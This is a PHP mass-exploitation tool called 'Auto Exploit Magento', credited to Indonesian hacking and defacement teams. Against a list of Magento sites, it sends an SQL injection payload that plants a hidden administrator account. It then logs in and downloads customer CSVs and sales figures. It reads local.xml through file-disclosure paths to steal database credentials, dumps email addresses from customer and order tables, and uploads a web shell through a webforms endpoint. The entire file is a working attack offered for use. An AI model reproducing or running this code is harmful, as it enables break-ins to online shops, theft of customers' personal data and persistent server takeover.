<?php
/**
* Code Name 	: Auto Exploit Magento
* Release   	: 2.0.1 build 13816
* Author    	: SHOR7CUT (http://facebook.com/bug7sec)
* Team      	: BUG7SEC | INDOXPLOIT CODERS TEAM | TUBAN CYBER TEAM | DEFACER TERSAKITI TEAM
* 
* PHP Version 	: 5.5.35
*/
error_reporting(0);
set_time_limit();
session_start();
$Magento = new Magento;
$Magento->username("kodomo123");
$Magento->password("kodomo123");
$Magento->target("list.txt");
$Magento->result("magento-result.txt");
$Magento->shellog("magento-shell.txt");
$Magento->mailog("magento-maillog.txt");
$Magento->xml("magento-xml.txt");
$Magento->shell("shc.php");
$Magento->cookies("cookies.txt");
$Magento->saveCSV("MAGENTO");
$Magento->run();

class Magento //extends Exploit
{
	var $username;
	var $password;
	var $target;
	var $result;
	var $email;
	var $saveCSV;
	var $shell;
	var $shellog;
	var $mailog;

	public function username($username)	{return $this->username = $username;}
	public function password($password)	{return $this->password = $password;}
	public function target($target)		{return $this->target 	= $target;}
	public function result($result)		{return $this->result 	= $result;}
	public function setJsite($result)	{return $this->Jsite 	= $result;}
	public function shell($shell)		{return $this->shell 	= $shell;}
	public function xml($xml)			{return $this->xml 		= $xml;}
	public function mailog($mailog)		{return $this->mailog 	= $mailog;}
	public function cookies($cookies)	{return $this->cookies 	= $cookies;}
	public function shellog($shellog)	{return $this->shellog 	= $shellog;}
	public function email(){
		return $this->email = substr(md5(time()),2,15)."@bug7sec.com";
	}
	public function saveCSV($saveCSV){
		return $this->saveCSV = $saveCSV;
	}
	public function pesan($pesan){
		echo "[".date("H:i:s")."] ".$pesan."\r\n";
	}
	public function create_session($data){
		return $_SESSION["data"][] = $data;
	}
	public function check_required(){
		if(! file_exists($this->target) ){
			$this->pesan("-> Tidak ditemukan File");
			exit();
		}
		if(! function_exists('curl_version') ){
			echo "+ CURL tidak terinstall\r\n";
			exit;
		}
		if (!file_exists("STUPIDCORP-TEAM")) {
			mkdir("STUPIDCORP-TEAM",0777);
			mkdir("STUPIDCORP-TEAM/".$this->saveCSV,0777);
		}
	}

	public function clean(){
		unlink("cookie.txt");
		unlink(getcwd().'/cookie.txt');
		return true;
	}
	public function host($sites){
		return parse_url($sites, PHP_URL_HOST);
	}
	public function saves($nama,$data){
      $myfile = fopen("STUPIDCORP-TEAM/".$nama, "a+") or die("Unable to open file!");
      fwrite($myfile, $data);
      fclose($myfile);
   	}

	public function generate($sites){
		$sites = parse_url($sites, PHP_URL_HOST);
		$this->pesan("[ Generate URL ] ".$sites);
		$ch = curl_init($sites);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0); 
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		$html = curl_exec($ch);
		$redirectURL = curl_getinfo($ch,CURLINFO_EFFECTIVE_URL );
		curl_close($ch);
		if( parse_url($redirectURL, PHP_URL_PATH) != "/" ){
			$uRL = "http://".parse_url($redirectURL, PHP_URL_HOST).parse_url($redirectURL, PHP_URL_PATH);
		}else{
			$uRL = "http://".parse_url($redirectURL, PHP_URL_HOST)."/";
		}
		$redirect 	= array(
	   		'admin' 	=> $uRL."admin",
			'download' 	=> $uRL."downloader",
			'upload' 	=> $uRL."js/webforms/upload/",
			'xml' 		=> $uRL,
			'payload' 	=> $uRL."admin/Cms_Wysiwyg/directive/index"
		);
	   	$noredirect = array(
	   		'admin' 	=> "http://".parse_url($redirectURL, PHP_URL_HOST)."/admin",
			'download' 	=> "http://".parse_url($redirectURL, PHP_URL_HOST)."/downloader",
			'upload' 	=> "http://".parse_url($redirectURL, PHP_URL_HOST)."/js/webforms/upload/",
			'xml' 		=> "http://".parse_url($redirectURL, PHP_URL_HOST),
			'payload' 	=> "http://".parse_url($redirectURL, PHP_URL_HOST)."/admin/Cms_Wysiwyg/directive/index"
		);
	   	$jsonSites = array(
	   		'redirect' 		=> $redirect,
	   		'noredirect' 	=> $noredirect);
	   	return $this->Jsite = $jsonSites;
	}

	public function magento_content($sites){
		$ch = curl_init($sites);
	    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
	    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
	    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT ,0); 
		curl_setopt ($ch, CURLOPT_TIMEOUT, 60);
	    curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
	    curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
	    curl_setopt ($ch, CURLOPT_COOKIEJAR, getcwd().'/'.$this->cookies);
	    curl_setopt ($ch, CURLOPT_COOKIEFILE,getcwd().'/'.$this->cookies);
	    $data = curl_exec ($ch);
	    return $data;
	}
	public function magento_rewire($value){
		if(!isset($value)){
			return "-";
		}
			return $value;
	}

	public function payload($sites){
		$post = array(
        "___directive"    => base64_encode("{{block type=Adminhtml/report_search_grid output=getCsvFile}}"),
        "filter"          => base64_encode("popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);SET @SALT =  'rp';SET @PASS = CONCAT(MD5(CONCAT( @SALT , '".$this->password."') ), CONCAT(':', @SALT ));SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','".$this->email."','".$this->username."',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '".$this->username."'),'Firstname');"),
        "forwarded"       => 1
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $sites);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, "msnbot/1.0 (+http://search.msn.com/msnbot.htm)");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0); 
		curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/'.$this->cookies);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/'.$this->cookies);
        curl_setopt($ch, CURLOPT_VERBOSE, false);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        $data = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if($httpcode == "200"){
        	return true;
        }else{
        	return false;
        }
	}

	public function admin($sites){
		/* ------- ambil token login ------- */
		$regex_loginTOKEN = "/<input name=\"form_key\" type=\"hidden\" value=\"(.*?)\" \\/>/"; 
		preg_match($regex_loginTOKEN, $this->magento_content($sites) , $token);
		/* ---------------------------------- */
		$ch = curl_init();
	    curl_setopt($ch, CURLOPT_URL, $sites);
	    curl_setopt($ch, CURLOPT_HEADER, false);
	    curl_setopt($ch, CURLOPT_USERAGENT, "msnbot/1.0 (+http://search.msn.com/msnbot.htm)");
	    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0); 
		curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/'.$this->cookies);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/'.$this->cookies);
	    curl_setopt($ch, CURLOPT_VERBOSE, false);
	    curl_setopt($ch, CURLOPT_POST, true);
	    curl_setopt($ch, CURLOPT_POSTFIELDS, "form_key=".$token[1]."&login[username]=".$this->username."&login[password]=".$this->password);
	    $data = curl_exec($ch);
	    $regex_result = "/<span class=\"price\">(.*?)<\\/span>/";
		preg_match_all($regex_result 	, $data , $matches);
	    if($matches[0][0]){
	    	$pesan_.=    "[ Admin Login ] ".$sites."\r\n";
	    	$this->pesan("[ Admin Login ] ".$this->host($sites)." +[OK]");
	    	/*------------------ start:customer -----------------------*/
	    	$regex_cusTOKEN = "/\\/customer\\/index\\/key\\/(.*?)\\//";
			preg_match_all($regex_cusTOKEN 	, $data , $matchToken); 
			$ch = curl_init($sites."/customer/index/key/".$matchToken[1][0]);
		    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
		    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
		    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
			curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT ,0); 
			curl_setopt ($ch, CURLOPT_TIMEOUT, 60);
		    curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
		    curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
        	curl_setopt ($ch, CURLOPT_COOKIEJAR,  getcwd().'/'.$this->cookies);
        	curl_setopt ($ch, CURLOPT_COOKIEFILE, getcwd().'/'.$this->cookies);
		    $resultsCUS = curl_exec($ch);
		    $cusRegex = "/<span id=\"customerGrid-total-count\" class=\"no-display\">(.*?)<\\/span>/";
			preg_match($cusRegex, $resultsCUS, $cusCount);
			if( $cusCount[1] ){
				$pesan_.=    "[ Data customer ] ".$cusCount[1]."\r\n";
				$this->pesan("[ Data customer ] ".$cusCount[1]." customer");
			}
			$this->pesan("[ Data Customer ] Mencoba download customer");
			$exportCsv = "/<option value=\"(.*?)\">CSV<\\/option>/";
			preg_match($exportCsv, $resultsCUS, $matchesCsv);
			$ch = curl_init();
			curl_setopt ($ch, CURLOPT_URL, $matchesCsv[1]);
			curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT ,0); 
			curl_setopt ($ch, CURLOPT_TIMEOUT, 60);
			curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
        	curl_setopt ($ch, CURLOPT_COOKIEJAR,  getcwd().'/'.$this->cookies);
        	curl_setopt ($ch, CURLOPT_COOKIEFILE, getcwd().'/'.$this->cookies);
			curl_setopt ($ch, CURLOPT_HEADER, 0);
			$out = curl_exec($ch);
			curl_close($ch);
			$fp = fopen("STUPIDCORP-TEAM/".$this->saveCSV."/".parse_url($sites, PHP_URL_HOST).'.csv', 'w');
			fwrite($fp, $out);
			fclose($fp);
			if($fp){
				$pesan_.=    "[ Data Customer ] berhasil di download\r\n";
				$this->pesan("[ Data Customer ] berhasil di download");
			}else{
				$pesan_.=    "[ Data Customer ] gagal di download\r\n";
				$this->pesan("[ Data Customer ] gagal di download");
			}
			/*---------------------------- end:customer | start:order -----------------------*/
			$regex_ajaxBlock = "/ajaxBlock\\/key\\/(.*?)\\//";
			preg_match($regex_ajaxBlock, $data, $matchesajaxBlock);
			$tk = $matchesajaxBlock[1];
			$periodeAct = array(
				'Hari' 		=> '24h',
				'Minggu' 	=> '7d',
				'Bulan' 	=> '1m',
				'Tahun' 	=> '1y'
			);                 
			foreach ($periodeAct as $key => $prioValue) {
				$link_periode = $sites."/dashboard/ajaxBlock/block/totals/key/".$tk."/period/".$prioValue."/?isAjax=true";
				$ch = curl_init($link_periode);
			    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
			    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
			    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT ,0); 
				curl_setopt ($ch, CURLOPT_TIMEOUT, 60);
			    curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
			    curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
        	    curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/'.$this->cookies);
        	    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/'.$this->cookies);
			    $prioResult = curl_exec($ch);
			    $ajaxBlockprice = "/\"price\">(.*?)</";
			    preg_match_all($ajaxBlockprice, $prioResult, $prioMatch);
			    $pesan_ .= "[ Order Period ] ".$periodeAct[$key]  ." : ".
			    	$this->magento_rewire($prioMatch[1][0])." | ".
			    	$this->magento_rewire($prioMatch[1][1])." | ".
			    	$this->magento_rewire($prioMatch[1][2])."\r\n";
			    $this->pesan("[ Order Period ] ".$periodeAct[$key]  ." -> ".
			    	$this->magento_rewire($prioMatch[1][0])." | ".
			    	$this->magento_rewire($prioMatch[1][1])." | ".
			    	$this->magento_rewire($prioMatch[1][2]));
			}
			$IDE = "/<span>IDE<\\/span>/";
      		$WP = "/<span>WordPress<\\/span>/";
      		$Smtp = "/SMTP/";
      		$Mandrill = "/Mandrill/";
      		preg_match_all($IDE     , $data , $matchIDE);
      		preg_match_all($WP      , $data , $matchWP);
      		preg_match_all($Smtp    , $data , $matchesSMTP);
      		preg_match($Mandrill    , $data , $matchesMandril);

		    if($matchIDE[0][0]){
		        $pesan_ .= "[+] IDE Home : Found !!!\r\n";
		    }
		    if($matchWP[0][0]){
		        $pesan_ .= "[+] WP Home  : Found !!!\r\n";
		    }
		    if($matchesSMTP[0][0]){
		        $pesan_ .= "[+] SMTP     : Found !!!\r\n";
		    }
		    if($matchesMandril[0][0]){
		        $pesan_ .= "[+] Mandril  : Found !!!\r\n";
		    }
		    return $pesan_;
	    }else{
	    	$this->pesan("[Admin Redirect ] ".$this->host($sites)." +[FAIL]");
	    	return false;
	    }
	}

	public function downloader($sites){
		$this->pesan("[ Download Login ] ".$this->host($sites));
		$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $sites);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, "msnbot/1.0 (+http://search.msn.com/msnbot.htm)");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT ,0); 
		curl_setopt ($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, false);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "username=".$this->username."&password=".$this->password);
        $data = curl_exec($ch);
        if(preg_match("/Log Out/i",$data) || (preg_match("/Return to Admin/i",$data))){
        	$this->pesan("[ Download Login ] ".$this->host($sites)." +[OK]");
        	$permission = (!preg_match("/Warning: Your Magento folder does not have sufficient write permissions./i",$data) ? "Writeable" : "Denied");
        	  $pesan_ .= "[ Download URL ] ".$sites."\r\n";
        	  $pesan_ .= "[ Download Login ] Success (Permission ".$permission.")\r\n\n";
        	$this->pesan("[ Download Login ] Success (Permission ".$permission.")");
        }else{
        	$pesan_ .= "[ Download Login ] failed\r\n\n";
        	$this->pesan("[Download Login ] ".$this->host($sites)." +[FAIL]");
        }
        return $pesan_;
	}

	public function LocalFileDiscloure($target){
      $path = array(
               "/app/etc/local.xml",
               "/magmi/web/download_file.php?file=../../app/etc/local.xml"
      );
      for($i=0;$i<=count($path);$i++){
         $test = $this->magento_content($target.$path[$i]);
         if(isset($test) && preg_match('/install/i',$test) && preg_match('/date/i',$test)){
         $re = "/<![CDATA[]+(.*?)[]]]>/";
         preg_match_all($re, $test, $matches);

         if(isset($matches[1][0])){
         $this->pesan("[ LFD Magento ] ".$this->host($target)." +[OK]");
         $shc_host = $matches[1][0];
         $shc_host = $matches[1][3];
         $shc_user = $matches[1][4];
         $shc_pass = $matches[1][5];
         $shc_db   = $matches[1][6];
         $infone   .= "------------------------------\r\n";
         $infone   .= "URL      : ".$target."\r\n";
         $infone   .= "Host     : ".$shc_host."\r\n";
         $infone   .= "Username : ".$shc_user."\r\n";
         $infone   .= "Password : ".$shc_pass."\r\n";
         $infone   .= "Database : ".$shc_db."\r\n";
         $infone   .= "------------------------------\r\n";
            $this->saves($this->xml,$infone);
        	mysql_connect($shc_host, $shc_user , $shc_pass);
        	mysql_select_db($shc_db);
        	$query = array(
		            'admin_user'                    => 'SELECT * FROM admin_user' ,
		            'aw_blog_comment'               => 'SELECT * FROM aw_blog_comment' ,
		            'core_email_queue_recipients'   => 'SELECT * FROM core_email_queue_recipients' ,
		            'customer_entity'               => 'SELECT * FROM customer_entity' ,
		            'newsletter_subscriber'         => 'SELECT * FROM newsletter_subscriber' ,
		            'newsletter_template'           => 'SELECT * FROM newsletter_template' ,
		            'sales_flat_order_address'      => 'SELECT * FROM sales_flat_order_address' ,
		            'sales_flat_quote'              => 'SELECT * FROM sales_flat_quote' ,
		            'sales_recurring_profile'       => 'SELECT * FROM sales_recurring_profile'
        	);
        	$shcolom = array(
		            'admin_user'                    => 'email' ,
		            'aw_blog_comment'               => 'email' ,
		            'core_email_queue_recipients'   => 'recipient_email' ,
		            'customer_entity'               => 'email' ,
		            'newsletter_subscriber'         => 'subscriber_email' ,
		            'newsletter_template'           => 'template_sender_email' ,
		            'sales_flat_order_address'      => 'email' ,
		            'sales_flat_quote'              => 'customer_email' ,
		            'sales_recurring_profile'       => 'SELECT * FROM admin_user'
        		);
		        foreach ($query as $shc_key => $shc_query) {
		            $hasil = mysql_query($shc_query);
		                while ( $kolom_db = mysql_fetch_assoc($hasil) ) {
		                    $mail[] = $kolom_db[$shcolom[$shc_key]];
		                }
		        }
		        
		   		foreach ($mail as $key => $emailes) {
		   			$this->saves($this->mailog,$emailes."\r\n");
		   		}
         	}else{
         		$this->pesan("[ LFD Magento ] ".$this->host($sites)." +[FAIL]");
         	}
         }
      }
    }

    public function webforms($sites){
    	$this->pesan("[ webforms ] ".$this->host($sites));
		$post = array('files[]'=>"@".$this->shell) ;
		$ch = curl_init();
		curl_setopt ($ch, CURLOPT_URL, $sites);
		curl_setopt ($ch, CURLOPT_USERAGENT, "msnbot/1.0 (+http://search.msn.com/msnbot.htm)");
		curl_setopt ($ch, CURLOPT_POST, true);
		curl_setopt ($ch, CURLOPT_POSTFIELDS,$post);
		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT ,0); 
		curl_setopt ($ch, CURLOPT_TIMEOUT, 60);
		$data = curl_exec($ch);
		curl_close($ch);
		$json = json_decode($data,true);
		if( $json['0']['url'] ){
			$this->saves($this->shellog,"Shell : ".$json['0']['url']."\r\n");
			return true;
		}
			return false;
	}


	public function run(){
		$this->check_required();
		$load_file = file_get_contents($this->target);
		$load_file = explode("\r\n", $load_file );
		$cnfile 	= count($load_file);
		$is = 1;
		foreach ($load_file as $key => $sites) {
		$this->pesan("[ Informasi ] Target ".$is."/".$cnfile." Situs");	
		$this->clean();
		$this->generate($sites);

		if ( $this->payload($this->Jsite['noredirect']['payload']) ){

			$this->pesan("[ Payload Noredirect ] ".$this->host($this->Jsite['noredirect']['payload'])." +[OK]");
			
			$admin    = $this->admin($this->Jsite['noredirect']['admin']);
			$download = $this->downloader($this->Jsite['noredirect']['download']);
			
			$this->saves($this->result,$admin);
			$this->saves($this->result,$download);

		}else if ( $this->payload($this->Jsite['redirect']['payload']) ){

			$this->pesan("[ Payload redirect ] ".$this->host($this->Jsite['redirect']['payload'])." +[OK]");
			
			$admin    = $this->admin($this->Jsite['redirect']['admin']);
			$download = $this->downloader($this->Jsite['redirect']['download']);

			$this->saves($this->result,$admin);
			$this->saves($this->result,$download."\r\n\n");

		}else{
			$this->pesan("[ Payload nore/redir ] ".$this->host($sites)." +[Not Vuln]");
		}

	
		if($this->Jsite['noredirect']['xml'] == $this->Jsite['redirect']['xml'] ){
			$this->LocalFileDiscloure($this->Jsite['noredirect']['xml']);
		}else{
			$this->LocalFileDiscloure($this->Jsite['noredirect']['xml']);
			$this->LocalFileDiscloure($this->Jsite['redirect']['xml']);
		}
		
		if( $this->Jsite['noredirect']['upload'] == $this->Jsite['redirect']['upload'] ){
				$this->webforms($this->Jsite['redirect']['upload']);
		}else{
				$this->webforms($this->Jsite['redirect']['upload']);
				$this->webforms($this->Jsite['noredirect']['upload']);
		}
			echo "\r\n";
			$is++;
		}
	}

}